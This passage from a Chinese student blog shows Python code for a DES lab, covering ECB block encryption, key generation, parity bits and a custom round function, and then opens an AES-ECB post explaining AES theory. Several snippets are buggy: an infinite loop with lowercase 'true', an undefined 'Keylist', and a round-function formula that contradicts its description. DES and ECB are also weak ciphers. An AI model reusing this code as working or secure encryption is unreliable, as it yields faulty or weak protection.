class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">    tmp = L16 + R16</span><br><span class="line">    retstr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> IPINVERSETABLE:</span><br><span class="line">        retstr += tmp[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> len(retstr) == <span class="number">64</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_ECB</span><span class="params">(ClearTxt,Keylist)</span>:</span></span><br><span class="line">    InitKeyCode = IP(ClearTxt)</span><br><span class="line">    Ln = InitKeyCode[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    Rn = InitKeyCode[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> Keylist:</span><br><span class="line">        <span class="keyword">while</span> len(Rn) &lt; <span class="number">32</span>:</span><br><span class="line">            Rn = <span class="string">"0"</span> + Rn</span><br><span class="line">        <span class="keyword">while</span> len(Ln) &lt; <span class="number">32</span>:</span><br><span class="line">            Ln = <span class="string">"0"</span> + Ln</span><br><span class="line">        print(<span class="string">"Ln : "</span>,Ln)</span><br><span class="line">        print(<span class="string">"Rn : "</span>, Rn)</span><br><span class="line">        Rn_expand = expend(Rn)</span><br><span class="line">        print(<span class="string">"Rn_expand : "</span>,Rn_expand)</span><br><span class="line">        S_Input = int(Rn_expand, base=<span class="number">2</span>) ^ int(key, base=<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">"S_Input : "</span>, S_Input)</span><br><span class="line">        S_sub_str = S_sub(S_Input)</span><br><span class="line">        print(<span class="string">"S_sub_str : "</span>, S_sub_str)</span><br><span class="line">        (Ln, Rn) = P(Ln, S_sub_str, Rn)</span><br><span class="line">    (Ln, Rn) = (Rn, Ln)</span><br><span class="line">    re_text = IP_inverse(Ln, Rn)</span><br><span class="line">    <span class="keyword">return</span> re_text</span><br></pre></td></tr></table></figure>

<h4 id="加密分组实现"><a href="#加密分组实现" class="headerlink" title="加密分组实现"></a>加密分组实现</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encryptmohex</span><span class="params">(tmplist)</span>:</span></span><br><span class="line">    str_bin = <span class="string">''</span>.join(tmplist)</span><br><span class="line">    groups = int(len(str_bin) / <span class="number">64</span>)</span><br><span class="line">    <span class="comment"># 生成加密分组</span></span><br><span class="line">    M = np.zeros((groups, <span class="number">64</span>))</span><br><span class="line">    index = <span class="number">-8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        index += <span class="number">8</span></span><br><span class="line">        strr = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            strr += tmplist[index + j]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            M[i][j] = int(strr[j])</span><br><span class="line">    print(<span class="string">"Your List Clear Text: "</span>, tmplist)</span><br><span class="line">    print(<span class="string">"Your Binary Clear Text: "</span>, str_bin)</span><br><span class="line">    print(<span class="string">"Your Hex Clear Text: "</span>, hex(int(str_bin, base=<span class="number">2</span>)).upper())</span><br><span class="line">    print(<span class="string">"Your Clear Text groups: "</span>, groups)</span><br><span class="line">    key_bin = inkey()</span><br><span class="line">    <span class="comment"># 打印加密群</span></span><br><span class="line">    AllCiphertext = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        print(<span class="string">"ClearText Group "</span>, i, <span class="string">": "</span>, end=<span class="string">''</span>)</span><br><span class="line">        tmptext = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            tmptext += str(int(M[i][j]))</span><br><span class="line">        ciphertext = Feistel(tmptext, key_bin, <span class="number">1</span>)</span><br><span class="line">        AllCiphertext += ciphertext</span><br><span class="line">        print(<span class="string">"Ciphertext: "</span>, ciphertext)</span><br><span class="line">    print(<span class="string">"Your Binary Ciphertext: "</span>, AllCiphertext)</span><br><span class="line">    print(<span class="string">"Your Hex Ciphertext: "</span>, hex(int(AllCiphertext, base=<span class="number">2</span>)).upper())</span><br></pre></td></tr></table></figure>

<h4 id="解密分组实现"><a href="#解密分组实现" class="headerlink" title="解密分组实现"></a>解密分组实现</h4><p>主函数同加密分组实现，只需要把密钥取反即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keylist = keylist[::<span class="number">-1</span>] <span class="comment">#INVERSEKEY</span></span><br></pre></td></tr></table></figure>

<h3 id="附加内容"><a href="#附加内容" class="headerlink" title="附加内容"></a>附加内容</h3><h4 id="用电码本模式对文件进行加密和解密"><a href="#用电码本模式对文件进行加密和解密" class="headerlink" title="用电码本模式对文件进行加密和解密"></a>用电码本模式对文件进行加密和解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opentxt</span><span class="params">()</span>:</span></span><br><span class="line">	 f = open(<span class="string">'/tmp/test.txt'</span>)</span><br><span class="line">     str1 = <span class="string">""</span></span><br><span class="line">     <span class="keyword">while</span> true:</span><br><span class="line">        str1 = f.readline()</span><br><span class="line">     <span class="keyword">return</span> str1</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encryptmostr</span><span class="params">(text)</span>:</span></span><br><span class="line">    lenth = len(text)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 补位操作</span></span><br><span class="line">    <span class="keyword">if</span> (lenth % <span class="number">8</span> == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = <span class="number">8</span> - lenth % <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        text += <span class="string">'A'</span></span><br><span class="line">    tmplist = encode(text)</span><br><span class="line">    groups = int(len(tmplist) / <span class="number">8</span>)</span><br><span class="line">    <span class="comment">#对齐8位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmplist)):</span><br><span class="line">        <span class="keyword">if</span> len(tmplist[i]) != <span class="number">8</span>:</span><br><span class="line">            tmpp = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span> - len(tmplist[i])):</span><br><span class="line">                tmpp += <span class="string">'0'</span></span><br><span class="line">            tmplist[i] = tmpp + tmplist[i]</span><br><span class="line">    str_bin = <span class="string">''</span>.join(tmplist)</span><br><span class="line">    <span class="comment">#生成加密分组</span></span><br><span class="line">    M = np.zeros((groups, <span class="number">64</span>))</span><br><span class="line">    index = <span class="number">-8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        index += <span class="number">8</span></span><br><span class="line">        strr = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> tmplist[index+j]:</span><br><span class="line">                strr += k</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            M[i][j] = int(strr[j])</span><br><span class="line">    print(<span class="string">"Your List Clear Text: "</span>,tmplist)</span><br><span class="line">    print(<span class="string">"Your Binary Clear Text: "</span>,str_bin)</span><br><span class="line">    print(<span class="string">"Your Hex Clear Text: "</span>, hex(int(str_bin, base=<span class="number">2</span>)).upper())</span><br><span class="line">    print(<span class="string">"Your Clear Text offset: "</span>, offset)</span><br><span class="line">    print(<span class="string">"Your Clear Text groups: "</span>, groups)</span><br><span class="line">    key_bin = inkey()</span><br><span class="line">    <span class="comment">#打印加密群</span></span><br><span class="line">    AllCiphertext = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):</span><br><span class="line">        print(<span class="string">"ClearText Group "</span>, i)</span><br><span class="line">        tmptext = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">            tmptext += str(int(M[i][j]))</span><br><span class="line">        ciphertext = Feistel(tmptext, key_bin, <span class="number">1</span>)</span><br><span class="line">        AllCiphertext += ciphertext</span><br><span class="line">        print(<span class="string">"Ciphertext: "</span>,ciphertext)</span><br><span class="line">    print(<span class="string">"Your Binary Ciphertext: "</span>,AllCiphertext)</span><br><span class="line">    print(<span class="string">"Your Hex Ciphertext: "</span>, hex(int(AllCiphertext, base=<span class="number">2</span>)).upper())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span><span class="comment">#字符串转二进制</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        tmp.append(bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>))</span><br><span class="line">    str_bin = <span class="string">' '</span>.join(tmp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line">        <span class="keyword">if</span> len(tmp[i]) != <span class="number">7</span>:</span><br><span class="line">            tmpp = <span class="string">""</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>-len(tmp[i])):</span><br><span class="line">                tmpp += <span class="string">'0'</span></span><br><span class="line">            tmp[i] =  tmpp + tmp[i]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParityCheck</span><span class="params">(s)</span>:</span><span class="comment">#偶校验</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">'1'</span>:</span><br><span class="line">            num = num +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>

<h4 id="自定义轮函数"><a href="#自定义轮函数" class="headerlink" title="自定义轮函数"></a>自定义轮函数</h4><p>F(W,K)=(1&lt;&lt;W)+K, 即W先循环左移1位再与K异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DIYDES</span><span class="params">(ClearTxt,Key,Model)</span>:</span></span><br><span class="line">    keylist = createkey(Key)</span><br><span class="line">    InitKeyCode = IP(ClearTxt)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> Keylist:</span><br><span class="line">        InitKeyCode = InitKeyCode &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        InitKeyCode = InitKeyCode ^ key</span><br><span class="line">     <span class="keyword">return</span> InitKeyCode</span><br></pre></td></tr></table></figure>

<h3 id="重要的实现细节"><a href="#重要的实现细节" class="headerlink" title="重要的实现细节"></a>重要的实现细节</h3><ul>
<li><p>随机密钥的生成</p>
<ul>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> model == <span class="string">"y"</span>:</span><br><span class="line">    tmplist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        j = random.randint(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">1</span>:</span><br><span class="line">            tmplist.append(chr(random.randint(<span class="number">48</span>, <span class="number">57</span>)))</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">2</span>:</span><br><span class="line">            tmplist.append(chr(random.randint(<span class="number">65</span>, <span class="number">90</span>)))</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">3</span>:</span><br><span class="line">            tmplist.append(chr(random.randint(<span class="number">97</span>, <span class="number">122</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmplist:</span><br><span class="line">        strr += i</span><br><span class="line">    keylist = encode(strr)</span><br><span class="line">    <span class="comment"># 补充奇偶校验位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keylist)):</span><br><span class="line">        keylist[i] = ParityCheck(keylist[i])</span><br><span class="line">    key_bin = <span class="string">''</span>.join(keylist)</span><br><span class="line">    print(<span class="string">"Your Key: "</span>, strr)</span><br><span class="line">    print(<span class="string">"Your Binary Key: "</span>, key_bin)</span><br><span class="line">    print(<span class="string">"Your Hex Key: "</span>, hex(int(key_bin, base=<span class="number">2</span>)).upper())</span><br><span class="line">    <span class="keyword">return</span> key_bin</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>校验位的生成和补位操作</p>
<ul>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParityCheck</span><span class="params">(s)</span>:</span><span class="comment">#偶校验</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">'1'</span>:</span><br><span class="line">            num = num +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        s += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> <span class="comment"># 补充奇偶校验位</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(keylist)):</span><br><span class="line">            keylist[i] = ParityCheck(keylist[i])</span><br><span class="line">        key_bin = <span class="string">''</span>.join(keylist)</span><br><span class="line">        print(<span class="string">"Your Key: "</span>, strr)</span><br><span class="line">        print(<span class="string">"Your Binary Key: "</span>, key_bin)</span><br><span class="line">        print(<span class="string">"Your Hex Key: "</span>, hex(int(key_bin, base=<span class="number">2</span>)).upper())</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h3 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h3><p>实现文本加密</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(21).png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(22).png" alt></p>
<p>实现十六进制输入加密</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(23).png" alt></p>
<p>实现二进制输入解密</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(24).png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94DES/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(25).png" alt></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="系统亮点"><a href="#系统亮点" class="headerlink" title="系统亮点"></a>系统亮点</h4><ul>
<li>实现了完成的Feistel密码结构的分层</li>
<li>实现了Key轮加密密钥的类抽象</li>
<li>实现了随机密钥的生成方法</li>
<li>提供了包括二进制、十六进制、字符串、文本文件在内的多种输入方式</li>
<li>提供了自定义轮函数的接口</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/12/AES-ECB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/12/AES-ECB/" class="post-title-link" itemprop="url">AES-ECB</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-12 19:24:07" itemprop="dateCreated datePublished" datetime="2019-10-12T19:24:07-07:00">2019-10-12</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-13 10:26:08" itemprop="dateModified" datetime="2019-10-13T10:26:08-07:00">2019-10-13</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ul>
<li><p>实现GF(28)加法与乘法运算并验算正确性</p>
<ul>
<li>算法运算采用多项式表示法</li>
<li>加法运算实际上就是按位异或</li>
<li>乘法运算实现要利用XTime运算来设计算法，取模11B</li>
<li>要用课本的例子验算是否正确实现</li>
</ul>
</li>
<li><p>实现系数在GF(28)上的多项式的乘法</p>
<ul>
<li>运算是4字节向量乘4字节向量（向量的分量表示多项式的系数）</li>
<li>输出是4字节向量</li>
<li>运算过程，字节对字节的加法就是异或，乘法需调用第1步实现的乘法</li>
</ul>
</li>
<li><p>AES算法实现</p>
<ul>
<li><p>输入：Nb, Nk, 明文分组，种子密钥，</p>
<p>输出：密文分组 </p>
<p>明文分组以字符串形式输入，密文分组以16进制形式输出，密钥的输入形式自行设计</p>
</li>
<li><p>实现字节代换ByteSub及逆代换InvByteSub</p>
</li>
<li><p>实现行移位ShiftRow及逆行移位InvShiftRow</p>
</li>
<li><p>实现列混淆MixColum及逆列混淆InvMixcColumn，注意，（逆）列混淆实现需要调用第2步实现的多项式乘法</p>
</li>
<li><p>用密钥编排算法获取轮密钥</p>
</li>
<li><p>实现AES加密与解密，注意加密密钥与解密密钥次序与差别</p>
</li>
</ul>
</li>
<li><p>附加内容</p>
<ul>
<li>用代码自动生成字节替换所用的S盒与逆S盒</li>
</ul>
</li>
</ul>
<h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：<br><img src="https://img-blog.csdn.net/20170219082909688?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="加密流程图"><br> 下面简单介绍下各个部分的作用与意义：</p>
<ul>
<li><p>明文P</p>
<blockquote>
<p>没有经过加密的数据。</p>
</blockquote>
</li>
<li><p>密钥K</p>
<blockquote>
<p>用来加密明文的密码，在对称加密算法中，加密与解密的密钥是相同的。密钥为接收方与发送方协商产生，但不可以直接在网络上传输，否则会导致密钥泄漏，通常是通过非对称加密算法加密密钥，然后再通过网络传输给对方，或者直接面对面商量密钥。密钥是绝对不可以泄漏的，否则会被攻击者还原密文，窃取机密数据。</p>
</blockquote>
</li>
<li><p>AES加密函数</p>
<blockquote>
<p>设AES加密函数为E，则 C = E(K, P),其中P为明文，K为密钥，C为密文。也就是说，把明文P和密钥K作为加密函数的参数输入，则加密函数E会输出密文C。</p>
</blockquote>
</li>
<li><p>密文C</p>
<blockquote>
<p>经加密函数处理后的数据</p>
</blockquote>
</li>
<li><p>AES解密函数</p>
<blockquote>
<p>设AES解密函数为D，则 P = D(K, C),其中C为密文，K为密钥，P为明文。也就是说，把密文C和密钥K作为解密函数的参数输入，则解密函数会输出明文P。</p>
</blockquote>
</li>
</ul>
<p>在这里简单介绍下对称加密算法与非对称加密算法的区别。</p>
<ul>
<li><p>对称加密算法</p>
<blockquote>
<p>加密和解密用到的密钥是相同的，这种加密方式加密速度非常快，适合经常发送数据的场合。缺点是密钥的传输比较麻烦。</p>
</blockquote>
</li>
<li><p>非对称加密算法</p>
<blockquote>
<p>加密和解密用的密钥是不同的，这种加密方式是用数学上的难解问题构造的，通常加密解密的速度比较慢，适合偶尔发送数据的场合。优点是密钥传输方便。常见的非对称加密算法为RSA、ECC和EIGamal。</p>
</blockquote>
</li>
</ul>
<p>实际中，一般是通过RSA加密AES的密钥，传输到接收方，接收方解密得到AES密钥，然后发送方和接收方用AES密钥来通信。</p>
<p>本文下面AES原理的介绍参考自《现代密码学教程》，AES的实现在介绍完原理后开始。</p>
<h3 id="AES的基本结构"><a href="#AES的基本结构" class="headerlink" title="AES的基本结构"></a>AES的基本结构</h3><p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：</p>
<table>
<thead>
<tr>
<th>AES</th>
<th>密钥长度（32位比特字)</th>
<th>分组长度(32位比特字)</th>
<th>加密轮数</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>4</td>
<td>4</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>6</td>
<td>4</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>8</td>
<td>4</td>
<td>14</td>
</tr>
</tbody></table>
<p>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。<br> 上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p>
<p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0  K1 … K15。如，明文分组为P =  abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：<br><img src="https://img-blog.csdn.net/20170219132548906?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="state"></p>
<p>现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下：<br><img src="https://img-blog.csdn.net/20170219134722812?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="state2"><br> 上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。</p>
<p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1],  …  ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：<br><img src="https://img-blog.csdn.net/20170219152638324?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMjgyMDUxNTM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="keystate"><br> 上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。</p>
